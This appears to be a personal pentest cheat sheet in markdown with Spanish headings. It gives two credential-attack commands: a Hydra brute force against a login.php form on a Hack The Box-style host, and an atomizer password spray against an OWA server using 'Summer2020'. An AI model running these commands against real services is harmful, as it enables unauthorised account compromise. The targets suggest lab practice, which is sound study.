# BruteForce

## Uso de Hydra

```null
hydra -C credentials.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

## Atomizer OWA

```null
python3 atomizer.py owa 10.10.10.210 'Summer2020' bruteusers
```